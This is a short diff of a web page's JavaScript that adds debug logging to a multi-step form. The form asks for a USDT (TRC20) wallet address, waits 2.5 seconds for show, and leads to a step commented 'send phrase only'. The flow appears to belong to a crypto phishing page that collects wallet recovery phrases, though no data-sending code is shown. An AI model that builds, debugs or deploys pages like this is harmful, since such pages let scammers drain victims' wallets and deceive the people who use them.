@@ -539,21 +539,25 @@ select:focus {
   }
 
   // Step 1 → Step 2
-  if (s1btn) {
-    s1btn.addEventListener('click', () => {
-      const addrEl = document.getElementById('addr');
-      const addr = addrEl ? addrEl.value.trim() : '';
-      if (!addr) {
-        showToast("Please enter your USDT (TRC20) wallet address.");
-        addrEl?.focus();
-        return;
-      }
-      setTimeout(() => {
-        s1.hidden = true;
-        s2.hidden = false;
-      }, 2500);
-    });
-  }
+if (s1btn) {
+  console.log("s1btn found, attaching listener");
+  s1btn.addEventListener('click', () => {
+    const addrEl = document.getElementById('addr');
+    const addr = addrEl ? addrEl.value.trim() : '';
+    if (!addr) {
+      showToast("Please enter your USDT (TRC20) wallet address.");
+      addrEl?.focus();
+      return;
+    }
+    console.log("Continue clicked, addr:", addr);
+    setTimeout(() => {
+      s1.hidden = true;
+      s2.hidden = false;
+    }, 2500);
+  });
+} else {
+  console.error("s1btn not found in DOM");
+}
 
   // Step 2 → Step 3 (send phrase only)
   if (s2btn) {
